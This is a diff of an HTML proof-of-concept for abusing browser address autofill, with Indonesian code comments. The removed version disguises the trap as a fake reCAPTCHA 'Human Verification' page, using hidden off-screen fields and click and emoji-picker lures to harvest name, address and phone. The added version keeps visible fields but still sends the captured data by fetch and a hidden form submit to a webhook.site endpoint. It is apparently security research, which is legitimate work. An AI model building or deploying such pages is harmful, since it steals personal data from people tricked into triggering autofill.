@@ -3,305 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Address Autofill PoC</title>
+    <title>Address Autofill Test</title>
     <style>
         body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: #f0f2f5;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0;
+            font-family: Arial, sans-serif;
             padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
         }
-
-        .card {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            max-width: 500px;
+        input {
             width: 100%;
+            padding: 10px;
+            margin: 5px 0 15px 0;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            box-sizing: border-box;
         }
-
-        h3 {
-            color: #1a73e8;
-            margin-top: 0;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-
-        /* Hidden address fields */
-        .address-fields {
-            position: fixed;
-            top: -1000px;
-            left: -1000px;
-            opacity: 5;
-            pointer-events: none;
-        }
-
-        /* Verification box */
-        .verify-box {
-            background: #e8f0fe;
-            border: 2px dashed #1a73e8;
-            border-radius: 12px;
-            padding: 25px;
-            text-align: center;
-            margin-bottom: 20px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .verify-box:hover {
-            background: #d2e3fc;
-            transform: scale(1.02);
-        }
-
-        .verify-text {
-            font-size: 18px;
-            color: #1a73e8;
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-
-        .verify-sub {
+        label {
+            font-weight: bold;
             font-size: 14px;
-            color: #5f6368;
         }
-
-        /* Emoji select dropdown */
-        .emoji-select {
-            text-align: center;
-            margin: 20px 0;
+        .container {
+            background: #f9f9f9;
+            padding: 20px;
+            border: 1px solid #ddd;
         }
-
-        select {
-            padding: 12px 30px;
-            font-size: 24px;
-            border: 2px solid #1a73e8;
-            border-radius: 50px;
-            background: white;
-            cursor: pointer;
-            outline: none;
-            appearance: none;
-        }
-
-        select:hover {
-            background: #f1f3f4;
-        }
-
-        /* Result box */
-        .result-box {
-            background: #1e1e1e;
-            color: #0f0;
-            padding: 15px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            margin-top: 20px;
-            border: 1px solid #333;
-            min-height: 60px;
-            word-break: break-all;
-        }
-
-        .result-label {
-            color: #aaa;
-            font-size: 12px;
-            margin-bottom: 5px;
-        }
-
-        .status-badge {
-            display: inline-block;
-            background: #1a73e8;
+        button {
+            background: #4CAF50;
             color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-bottom: 10px;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 20px;
         }
-
-        .footer {
-            text-align: center;
+        #log {
             margin-top: 20px;
-            color: #5f6368;
+            padding: 10px;
+            background: #ffd;
+            border: 1px solid #cc0;
+            font-family: monospace;
             font-size: 12px;
+            white-space: pre-wrap;
+            word-break: break-all;
         }
     </style>
 </head>
 <body>
-
-<div class="card">
-    <div style="display: flex; justify-content: space-between; align-items: center;">
-        <h3>🔐 Human Verification</h3>
-        <span class="status-badge">Step 1 of 2</span>
+    <button id="trigger">Trigger Autofill</button>
+    
+    <div class="container">
+        <form id="addressForm" action="https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3" method="POST">
+            <label>First name</label>
+            <input type="text" id="firstname" name="firstname" autocomplete="given-name">
+            
+            <label>Middle name</label>
+            <input type="text" id="middlename" name="middlename" autocomplete="additional-name">
+            
+            <label>Last name</label>
+            <input type="text" id="lastname" name="lastname" autocomplete="family-name">
+            
+            <label>Phone number</label>
+            <input type="tel" id="phone" name="phone" autocomplete="tel">
+            
+            <label>Street address</label>
+            <input type="text" id="address" name="address" autocomplete="address-line1">
+            
+            <label>City</label>
+            <input type="text" id="city" name="city" autocomplete="address-level2">
+            
+            <label>State</label>
+            <input type="text" id="state" name="state" autocomplete="address-level1">
+            
+            <label>ZIP code</label>
+            <input type="text" id="zip" name="zip" autocomplete="postal-code">
+            
+            <label>Country</label>
+            <input type="text" id="country" name="country" autocomplete="country-name">
+            
+            <!-- Hidden submit button -->
+            <input type="submit" style="display:none;" id="hiddenSubmit">
+        </form>
     </div>
     
-    <!-- Hidden address fields (autofill targets) -->
-    <div class="address-fields">
-        <input type="text" id="name" name="name" autocomplete="name">
-        <input type="text" id="address-line1" name="address-line1" autocomplete="address-line1">
-        <input type="text" id="address-line2" name="address-line2" autocomplete="address-line2">
-        <input type="text" id="city" name="city" autocomplete="address-level2">
-        <input type="text" id="state" name="state" autocomplete="address-level1">
-        <input type="text" id="country" name="country" autocomplete="country-name">
-        <input type="text" id="postal" name="postal-code" autocomplete="postal-code">
-        <input type="tel" id="phone" name="tel" autocomplete="tel">
-    </div>
-
-    <!-- Verification box - click target -->
-    <div class="verify-box" id="verifyBox">
-        <div class="verify-text">🤖 Click to verify you're human</div>
-        <div class="verify-sub">Complete the puzzle below</div>
-    </div>
-
-    <!-- Emoji select dropdown -->
-    <div class="emoji-select">
-        <select id="emojiPicker">
-            <option>🔍 Select an animal</option>
-            <option>&emsp;&emsp;🐶&emsp;&emsp;</option>
-            <option>&emsp;&emsp;🐱&emsp;&emsp;</option>
-            <option>&emsp;&emsp;🐼&emsp;&emsp;</option>
-            <option>&emsp;&emsp;🦊&emsp;&emsp;</option>
-        </select>
-    </div>
-
-    <!-- Result display -->
-    <div class="result-label">📋 Captured Address Data:</div>
-    <div class="result-box" id="result">
-        Waiting for verification...
-    </div>
+    <div id="log">Waiting for autofill...</div>
     
-    <div class="footer">
-        Protected by reCAPTCHA • Human verification required
-    </div>
-</div>
-
-<script>
-    const verifyBox = document.getElementById('verifyBox');
-    const emojiPicker = document.getElementById('emojiPicker');
-    const resultDiv = document.getElementById('result');
-    
-    // Track if already triggered
-    let verificationDone = false;
-    
-    // Function to capture all address fields
-    function captureAddressData() {
-        const addressData = {
-            name: document.getElementById('name').value,
-            address_line1: document.getElementById('address-line1').value,
-            address_line2: document.getElementById('address-line2').value,
-            city: document.getElementById('city').value,
-            state: document.getElementById('state').value,
-            country: document.getElementById('country').value,
-            postal: document.getElementById('postal').value,
-            phone: document.getElementById('phone').value,
-            timestamp: new Date().toISOString()
-        };
+    <script>
+        const trigger = document.getElementById('trigger');
+        const log = document.getElementById('log');
+        const form = document.getElementById('addressForm');
+        const hiddenSubmit = document.getElementById('hiddenSubmit');
         
-        // Display in result box
-        resultDiv.innerHTML = JSON.stringify(addressData, null, 2);
+        // Data yang akan dikirim
+        let capturedData = {};
         
-        // Send to webhook
-        fetch('https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3', {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(addressData)
+        // Trigger autofill dengan fokus ke field pertama
+        trigger.addEventListener('click', function() {
+            document.getElementById('firstname').focus();
+            log.innerHTML = '⚡ Autofill triggered - pilih alamat dari dropdown';
         });
         
-        // Update verification box
-        verifyBox.innerHTML = `
-            <div class="verify-text">✅ Verified! Address captured</div>
-            <div class="verify-sub">Data sent to server</div>
-        `;
-        verifyBox.style.background = '#e6f4ea';
-        verifyBox.style.borderColor = '#34a853';
-    }
-    
-    // Main trigger function
-    function triggerAutofill() {
-        if (verificationDone) return;
-        
-        // Focus on name field to trigger autofill
-        document.getElementById('name').focus();
-        
-        // Show the emoji picker (like in the reference)
-        emojiPicker.showPicker();
-        
-        // After a short delay, trigger the address autofill picker
-        setTimeout(() => {
-            // Try to trigger the address autofill dropdown
-            document.getElementById('name').focus();
-            
-            // In Chrome, this might trigger the autofill dropdown
-            // Click on the field programmatically
-            document.getElementById('name').click();
-            
-            // For iOS, we need to simulate user interaction
-            const event = new MouseEvent('click', {
-                view: window,
-                bubbles: true,
-                cancelable: true
+        // Monitor semua input fields
+        const inputs = document.querySelectorAll('input[type="text"], input[type="tel"]');
+        inputs.forEach(input => {
+            input.addEventListener('input', function() {
+                capturedData[this.name] = this.value;
+                log.innerHTML = '📝 Data terdeteksi:\n' + JSON.stringify(capturedData, null, 2);
             });
-            document.getElementById('name').dispatchEvent(event);
             
-        }, 100);
-        
-        verificationDone = true;
-    }
-    
-    // Event listeners for address fields
-    const addressFields = document.querySelectorAll('.address-fields input');
-    addressFields.forEach(field => {
-        field.addEventListener('input', function() {
-            // Check if all fields are filled
-            const name = document.getElementById('name').value;
-            const address = document.getElementById('address-line1').value;
-            
-            if (name && address && !verificationDone) {
-                captureAddressData();
-            }
+            input.addEventListener('change', function() {
+                capturedData[this.name] = this.value;
+                log.innerHTML = '✅ Data berubah:\n' + JSON.stringify(capturedData, null, 2);
+                
+                // Cek apakah semua field penting sudah terisi
+                if (capturedData.firstname && capturedData.lastname && capturedData.phone) {
+                    // Kirim ke webhook
+                    capturedData.timestamp = new Date().toISOString();
+                    
+                    fetch('https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(capturedData)
+                    });
+                    
+                    log.innerHTML = '📤 DATA TERKIRIM KE WEBHOOK!\n' + JSON.stringify(capturedData, null, 2);
+                    
+                    // Submit form juga
+                    hiddenSubmit.click();
+                }
+            });
         });
         
-        field.addEventListener('change', function() {
-            const name = document.getElementById('name').value;
-            const address = document.getElementById('address-line1').value;
-            
-            if (name && address && !verificationDone) {
-                captureAddressData();
-            }
+        // Auto-submit saat form dikirim
+        form.addEventListener('submit', function(e) {
+            e.preventDefault(); // Mencegah redirect
+            log.innerHTML = '📨 Form submitted - data sudah dikirim';
         });
-    });
-    
-    // Click on verification box triggers the flow
-    verifyBox.addEventListener('click', function() {
-        triggerAutofill();
         
-        // Visual feedback
-        this.style.background = '#d2e3fc';
-        setTimeout(() => {
-            this.style.background = '#e8f0fe';
-        }, 200);
-    });
-    
-    // Also trigger when emoji picker is opened
-    emojiPicker.addEventListener('click', function() {
-        if (!verificationDone) {
-            triggerAutofill();
-        }
-    });
-    
-    // Double-click anywhere also triggers (like in reference)
-    document.addEventListener('dblclick', function() {
-        if (!verificationDone) {
-            triggerAutofill();
-        }
-    });
-    
-    console.log('=== Address Autofill PoC Ready ===');
-    console.log('Webhook: https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3');
-</script>
-
+        console.log('Ready - Webhook: https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3');
+    </script>
 </body>
 </html>
